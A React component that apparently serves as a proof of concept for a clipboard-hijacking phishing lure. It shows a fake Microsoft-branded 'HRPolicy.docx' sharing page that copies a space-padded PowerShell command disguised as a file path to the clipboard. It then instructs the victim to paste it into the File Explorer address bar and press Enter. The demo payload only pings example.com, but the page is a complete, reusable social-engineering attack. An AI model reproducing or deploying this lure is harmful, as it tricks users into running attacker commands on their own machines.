import { useRef } from 'react';

export default function SharedFilePage() {
  const fileInputRef = useRef(null);

  const handleCopy = () => {
    navigator.clipboard.writeText(
      'Powershell.exe -c ping example.com                                                                                                                # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx                                                                    '
    );
  };

  const handleOpenExplorer = () => {
    handleCopy();
    fileInputRef.current.click();
  };

  const handleFileChange = (e) => {
    alert('Please follow the stated instructions.');
    e.target.value = '';
    setTimeout(() => fileInputRef.current.click(), 500);
  };

  return (
    <div className="min-h-screen flex justify-center items-start bg-gray-100 py-10 font-sans">
      <div className="bg-white w-[560px] rounded-md shadow-lg border border-gray-300 text-center">
        {/* Header */}
        <div className="px-8 pt-10 pb-2">
          <svg
            fill="#000000"
            width="50"
            height="50"
            viewBox="0 0 32 32"
            xmlns="http://www.w3.org/2000/svg"
            className="mx-auto mb-6"
          >
            <path d="M0 25.472q0 2.368 1.664 4.032t4.032 1.664h18.944q2.336 0 4-1.664t1.664-4.032v-8.192l-3.776 3.168v5.024q0 0.8-0.544 1.344t-1.344 0.576h-18.944q-0.8 0-1.344-0.576t-0.544-1.344v-18.944q0-0.768 0.544-1.344t1.344-0.544h9.472v-3.776h-9.472q-2.368 0-4.032 1.664t-1.664 4v18.944zM5.696 19.808q0 2.752 1.088 5.28 0.512-2.944 2.24-5.344t4.288-3.872 5.632-1.664v5.6l11.36-9.472-11.36-9.472v5.664q-2.688 0-5.152 1.056t-4.224 2.848-2.848 4.224-1.024 5.152zM32 22.080v0 0 0z" />
          </svg>
          <h2 className="text-xl text-gray-800 font-semibold mb-1">
            mr.d0x made "HRPolicy.docx" available to you
          </h2>
          <div className="text-sm text-gray-500">06/20/2025 10:22:45 AM</div>
        </div>

        {/* Instructions */}
        <div className="text-left px-10 py-6 text-[15px] text-gray-700 leading-relaxed">
          <p className="mb-4">
            To access <strong>HRPolicy.docx</strong>, follow these steps:
          </p>
          <ol className="list-decimal pl-5 space-y-4">
            <li>
              Copy the file path below
              <div
                onClick={handleCopy}
                className="relative bg-gray-100 border border-gray-300 rounded px-3 py-2 mt-2 font-mono text-sm cursor-pointer hover:bg-gray-200 transition"
              >
                C:\company\internal-secure\filedrive\HRPolicy.docx
                <span className="absolute right-3 top-1/2 transform -translate-y-1/2 text-blue-600 text-xs opacity-0 hover:opacity-100">
                  Copy
                </span>
              </div>
            </li>
            <li>
              Open File Explorer and select the address bar (
              <strong>CTRL + L</strong>)
            </li>
            <li>
              Paste the file path and press <strong>Enter</strong>
            </li>
          </ol>
        </div>

        {/* File Explorer Button */}
        <input
          type="file"
          ref={fileInputRef}
          onChange={handleFileChange}
          className="hidden"
        />
        <button
          onClick={handleOpenExplorer}
          className="bg-blue-600 text-white font-medium text-base py-3 px-8 rounded hover:bg-blue-800 transition my-8"
        >
          Open File Explorer
        </button>

        {/* Footer */}
        <div className="text-xs text-gray-500 bg-gray-100 border-t border-gray-300 px-6 py-3 flex items-center justify-between">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"
            alt="Microsoft"
            className="h-4"
          />
        </div>
      </div>
    </div>
  );
}

